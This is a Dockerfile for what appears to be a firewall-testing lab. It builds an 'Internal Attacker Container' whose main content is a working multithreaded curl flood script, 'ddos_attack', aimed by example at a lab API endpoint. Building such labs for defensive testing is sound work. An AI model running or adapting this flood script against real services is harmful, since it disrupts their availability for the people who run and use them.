FROM alpine:3.18

# Install essential tools
RUN apk add --no-cache \
    curl \
    iputils \
    iproute2 \
    netcat-openbsd \
    bash \
    && rm -rf /var/cache/apk/*

# Create DDoS attack script
RUN mkdir -p /usr/local/bin && \
    echo '#!/bin/bash' > /usr/local/bin/ddos_attack && \
    echo '' >> /usr/local/bin/ddos_attack && \
    echo '# DDoS Attack Simulation Script' >> /usr/local/bin/ddos_attack && \
    echo '# Usage: ddos_attack <target_url> <num_threads> <requests_per_thread>' >> /usr/local/bin/ddos_attack && \
    echo '' >> /usr/local/bin/ddos_attack && \
    echo 'if [ "$#" -lt 1 ]; then' >> /usr/local/bin/ddos_attack && \
    echo '    echo "Usage: ddos_attack <target_url> [threads] [requests_per_thread]"' >> /usr/local/bin/ddos_attack && \
    echo '    echo "Example: ddos_attack http://firewall:5000/api/employees 10 100"' >> /usr/local/bin/ddos_attack && \
    echo '    echo ""' >> /usr/local/bin/ddos_attack && \
    echo '    echo "Default: 10 threads, 100 requests per thread"' >> /usr/local/bin/ddos_attack && \
    echo '    exit 1' >> /usr/local/bin/ddos_attack && \
    echo 'fi' >> /usr/local/bin/ddos_attack && \
    echo '' >> /usr/local/bin/ddos_attack && \
    echo 'TARGET_URL=$1' >> /usr/local/bin/ddos_attack && \
    echo 'THREADS=${2:-10}' >> /usr/local/bin/ddos_attack && \
    echo 'REQUESTS=${3:-100}' >> /usr/local/bin/ddos_attack && \
    echo '' >> /usr/local/bin/ddos_attack && \
    echo 'echo "==========================================="' >> /usr/local/bin/ddos_attack && \
    echo 'echo "      DDoS ATTACK SIMULATION"' >> /usr/local/bin/ddos_attack && \
    echo 'echo "==========================================="' >> /usr/local/bin/ddos_attack && \
    echo 'echo "Target:   $TARGET_URL"' >> /usr/local/bin/ddos_attack && \
    echo 'echo "Threads:  $THREADS"' >> /usr/local/bin/ddos_attack && \
    echo 'echo "Requests: $REQUESTS per thread"' >> /usr/local/bin/ddos_attack && \
    echo 'echo "Total:    $((THREADS * REQUESTS)) requests"' >> /usr/local/bin/ddos_attack && \
    echo 'echo "==========================================="' >> /usr/local/bin/ddos_attack && \
    echo 'echo ""' >> /usr/local/bin/ddos_attack && \
    echo '' >> /usr/local/bin/ddos_attack && \
    echo '# Function to send requests in a thread' >> /usr/local/bin/ddos_attack && \
    echo 'attack_thread() {' >> /usr/local/bin/ddos_attack && \
    echo '    local thread_id=$1' >> /usr/local/bin/ddos_attack && \
    echo '    local requests=$2' >> /usr/local/bin/ddos_attack && \
    echo '    local success=0' >> /usr/local/bin/ddos_attack && \
    echo '    local failed=0' >> /usr/local/bin/ddos_attack && \
    echo '    ' >> /usr/local/bin/ddos_attack && \
    echo '    for ((i=1; i<=requests; i++)); do' >> /usr/local/bin/ddos_attack && \
    echo '        if curl -s -o /dev/null -w "%{http_code}" --max-time 2 "$TARGET_URL" > /dev/null 2>&1; then' >> /usr/local/bin/ddos_attack && \
    echo '            ((success++))' >> /usr/local/bin/ddos_attack && \
    echo '        else' >> /usr/local/bin/ddos_attack && \
    echo '            ((failed++))' >> /usr/local/bin/ddos_attack && \
    echo '        fi' >> /usr/local/bin/ddos_attack && \
    echo '        ' >> /usr/local/bin/ddos_attack && \
    echo '        # Progress indicator every 10 requests' >> /usr/local/bin/ddos_attack && \
    echo '        if [ $((i % 10)) -eq 0 ]; then' >> /usr/local/bin/ddos_attack && \
    echo '            echo "[Thread $thread_id] Progress: $i/$requests requests sent"' >> /usr/local/bin/ddos_attack && \
    echo '        fi' >> /usr/local/bin/ddos_attack && \
    echo '    done' >> /usr/local/bin/ddos_attack && \
    echo '    ' >> /usr/local/bin/ddos_attack && \
    echo '    echo "[Thread $thread_id] Completed: $success successful, $failed failed"' >> /usr/local/bin/ddos_attack && \
    echo '}' >> /usr/local/bin/ddos_attack && \
    echo '' >> /usr/local/bin/ddos_attack && \
    echo '# Launch attack threads' >> /usr/local/bin/ddos_attack && \
    echo 'START_TIME=$(date +%s)' >> /usr/local/bin/ddos_attack && \
    echo '' >> /usr/local/bin/ddos_attack && \
    echo 'for ((t=1; t<=THREADS; t++)); do' >> /usr/local/bin/ddos_attack && \
    echo '    attack_thread $t $REQUESTS &' >> /usr/local/bin/ddos_attack && \
    echo 'done' >> /usr/local/bin/ddos_attack && \
    echo '' >> /usr/local/bin/ddos_attack && \
    echo '# Wait for all threads to complete' >> /usr/local/bin/ddos_attack && \
    echo 'wait' >> /usr/local/bin/ddos_attack && \
    echo '' >> /usr/local/bin/ddos_attack && \
    echo 'END_TIME=$(date +%s)' >> /usr/local/bin/ddos_attack && \
    echo 'DURATION=$((END_TIME - START_TIME))' >> /usr/local/bin/ddos_attack && \
    echo '' >> /usr/local/bin/ddos_attack && \
    echo 'echo ""' >> /usr/local/bin/ddos_attack && \
    echo 'echo "==========================================="' >> /usr/local/bin/ddos_attack && \
    echo 'echo "Attack completed in $DURATION seconds"' >> /usr/local/bin/ddos_attack && \
    echo 'echo "Check firewall dashboard for blocked traffic"' >> /usr/local/bin/ddos_attack && \
    echo 'echo "==========================================="' >> /usr/local/bin/ddos_attack && \
    chmod +x /usr/local/bin/ddos_attack

# Create info script
RUN echo '#!/bin/bash' > /usr/local/bin/info && \
    echo 'echo "==========================================="' >> /usr/local/bin/info && \
    echo 'echo "Internal Attacker Container"' >> /usr/local/bin/info && \
    echo 'echo "==========================================="' >> /usr/local/bin/info && \
    echo 'echo ""' >> /usr/local/bin/info && \
    echo 'echo "This container can perform DDoS attacks"' >> /usr/local/bin/info && \
    echo 'echo "from INSIDE the internal network."' >> /usr/local/bin/info && \
    echo 'echo ""' >> /usr/local/bin/info && \
    echo 'echo "Available commands:"' >> /usr/local/bin/info && \
    echo 'echo "  ddos_attack <url> [threads] [requests]  - Launch DDoS attack"' >> /usr/local/bin/info && \
    echo 'echo "  curl http://firewall:5000/api/employees - Normal API request"' >> /usr/local/bin/info && \
    echo 'echo "  ping firewall                           - Test connectivity"' >> /usr/local/bin/info && \
    echo 'echo "  ip addr                                 - Show IP"' >> /usr/local/bin/info && \
    echo 'echo ""' >> /usr/local/bin/info && \
    echo 'echo "Example attack:"' >> /usr/local/bin/info && \
    echo 'echo "  ddos_attack http://firewall:5000/api/employees 10 100"' >> /usr/local/bin/info && \
    echo 'echo "  (This will send 1000 requests rapidly)"' >> /usr/local/bin/info && \
    echo 'echo ""' >> /usr/local/bin/info && \
    echo 'echo "Container IP: $(hostname -i)"' >> /usr/local/bin/info && \
    echo 'echo "MAC Address: $(ip link show eth0 | grep link/ether | awk '\''{print $2}'\'')"' >> /usr/local/bin/info && \
    echo 'echo "==========================================="' >> /usr/local/bin/info && \
    chmod +x /usr/local/bin/info

WORKDIR /root

CMD ["/bin/bash", "-c", "/usr/local/bin/info && tail -f /dev/null"]
